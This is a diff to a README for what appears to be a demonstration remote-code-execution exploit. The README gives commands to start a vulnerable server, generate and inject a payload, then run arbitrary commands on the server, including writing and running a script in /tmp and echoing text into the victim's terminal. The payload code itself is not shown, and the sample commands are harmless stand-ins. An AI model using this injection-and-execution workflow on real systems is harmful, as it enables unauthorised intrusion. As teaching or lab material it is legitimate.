@@ -1,27 +1,27 @@
 # Setup
 ```console
-npm install
+$ npm install
 ```
 
 # Run
 ```console
-npm run server
+server-terminal $ npm run server
 ```
 
 # Inject
 ```console
-npm run generate_payload
-./inject.sh
+attacker-terminal $ npm run generate_payload
+attacker-terminal $ ./inject.sh
 ```
 
 # Exploit
 ## Run Remote Code
 ```console
-./execute_command.sh 'echo "echo asdf" > /tmp/scary_virus.sh'
-./execute_command.sh '/tmp/scary_virus.sh'
+attacker-terminal $ ./execute_command.sh 'echo "echo asdf" > /tmp/scary_virus.sh'
+attacker-terminal $ ./execute_command.sh '/tmp/scary_virus.sh'
 ```
 
 ## Prank
 ```console
-./execute_command.sh 'echo hi >> /dev/pts/$(ls -t /dev/pts | head -n 1)'
+attacker-terminal $ ./execute_command.sh 'echo hi >> /dev/pts/$(ls -t /dev/pts | head -n 1)'
 ```
